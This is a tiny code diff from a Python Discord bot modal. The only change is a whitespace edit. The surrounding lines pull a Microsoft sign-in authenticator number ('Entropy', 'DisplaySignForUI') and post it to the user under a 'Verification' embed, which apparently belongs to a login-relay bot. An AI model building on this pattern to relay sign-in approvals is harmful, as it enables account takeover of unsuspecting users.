@@ -119,7 +119,7 @@ class MyModalOne(ui.Modal):
                     entropy = response.json()["DisplaySignForUI"]
             else:
                 entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]
-
+                
             await interaction.followup.send(
                 embed = Embed(
                     title="Verification",
